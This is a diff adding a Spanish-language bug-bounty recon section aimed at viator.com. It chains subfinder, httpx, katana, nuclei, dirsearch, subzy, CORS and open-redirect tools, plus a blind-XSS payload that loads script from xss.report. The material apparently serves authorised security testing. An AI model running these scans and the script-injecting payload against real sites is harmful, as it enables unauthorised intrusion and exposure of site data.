@@ -485,10 +485,104 @@
 
 
 
+# ***III. Metodologia Bug Hunting***
+
+### 1. Encontrar subdominios con subfinder
+
+```bash
+subfinder -d viator.com -all  -recursive > subdomain.txt
+```
+
+### 2. Usando httpx-toolkit
+
+```bash
+cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt
+```
+
+### 3. Usando katana
+
+```bash
+katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt
+```
+
+### 4. Filtrar por extensiones
+
+```bash
+cat allurls.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config"
+```
+
+### 5. Filtrar extensiones javascript
+
+```bash
+cat allurls.txt | grep -E "\.js$" >> js.txt
+```
+
+### 6. Usando nuclei para ver encontrar Information disclosure
+
+```bash
+cat js.txt | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/ 
+```
+
+### 7. Usando nuclei para ver encontrar Information disclosure en un sitio web
+
+```bash
+echo www.viator.com | katana -ps | grep -E "\.js$" | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/ -c 30
+```
+
+### 8. Buscar con dirsearch directorios ocultos vulnerables
+
+```bash
+dirsearch  -u https://www.viator.com -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json
+```
+
+### 9. Buscar con subfinder, httpx, katana, gf, bxss en el sitio web vulnerabilidades xss
+
+```bash
+subfinder -d viator.com | httpx-toolkit -silent |  katana -ps -f qurl | gf xss | bxss -appendMode -payload '"><script src=https://xss.report/c/coffinxp></script>' -parameters
+```
+
+### 10. Ver certificados SSL vulnerable
+
+```bash
+subzy run --targets subdomains_alive.txt --verify_ssl
+```
+```bash
+subzy run --targets subdomains_alive.txt --concurrency 100 --hide_fails --verify_ssl
+```
+
+### 11. CORS
+
+```bash
+python3 corsy.py -i /home/coffinxp/vaitor/subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"
+
+```
+### 12. CORS con Nuclei
+
+```bash
+nuclei -list subdomains_alive.txt -t /home/coffinxp/Priv8-Nuclei/cors
+```
+
+### 13. Nuclei
+
+```bash
+nuclei  -list ~/vaitor/subdomains_alive.txt -tags cve,osint,tech
+```
+
+### 14. LFI
+
+```bash
+cat allurls.txt | gf lfi | nuclei -tags lfi
+```
+
+### 15. OR Open Redirect
+
+```bash
+cat allurls.txt | gf redirect | openredirex -p /home/coffinxp/openRedirect
+```
 
 
 
-# ***III. Metodologia XXS***
+# ***IV. Metodologia XXS***
 
 `Herramientas utilizadas`.
   ```bash
@@ -507,7 +601,7 @@
    -........)
    ```
 
-# ***III. Metodologia SQL Injection***
+# ***V. Metodologia SQL Injection***
 
 1. Buscará directamente todos los subdominios basados ​​en **php**, **asp**, **jsp**, **jspx**, **aspx**.
 
@@ -522,7 +616,7 @@
 
    
 
-# ***IV. Dark Web***
+# ***VI. Dark Web***
 
 ## Wiki
 
